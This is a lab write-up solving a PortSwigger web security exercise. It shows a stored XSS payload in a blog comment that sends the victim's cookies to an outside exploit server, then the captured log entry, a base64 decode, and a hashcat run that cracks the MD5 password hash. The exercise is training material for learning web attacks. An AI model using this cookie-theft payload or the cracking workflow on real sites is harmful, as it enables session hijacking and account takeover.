# Lab: Offline password cracking

### Instructions

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos

### Solution

We can use the provided credentials to login to the app, and first we can gather our exploit server url: `https://exploit-0af500640485d25a80504dfb01d0004a.exploit-server.net/test`

Now, knowing the comment feature in the blog is vulnerable to XSS, we can use a basic payload to intercept the `stay-logged-in` cookie:

```
<script>document.location='//exploit-0af500640485d25a80504dfb01d0004a.exploit-server.net/test'+document.cookie</script>
```

Looking at the exploit server's logs we find an entry:

```
"GET /testsecret=DqKPpritlXIiT0kldpzIxQGR0B9VH0i9;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

We can base64 decode the `stay-logged-in` cookie:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_10_offline_password_cracking]
└─$ echo "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d
carlos:26323c16d5f4dabff3bb136f2460a943 
```

And crack the md5 hash for carlos' password:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_10_offline_password_cracking]
└─$ hashcat '26323c16d5f4dabff3bb136f2460a943' /usr/share/wordlists/rockyou.txt -m 0
hashcat (v6.2.6) starting
<SNIP>
26323c16d5f4dabff3bb136f2460a943:onceuponatime            
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 26323c16d5f4dabff3bb136f2460a943
<SNIP>
```
We can use this password to login as carlos, delete his account, and solve the lab.

Note: I usually create an automated script of each lab in Python, but this one doesn't really lend itself to point and click automation like the others, so I'm just sticking to the manual solution here.

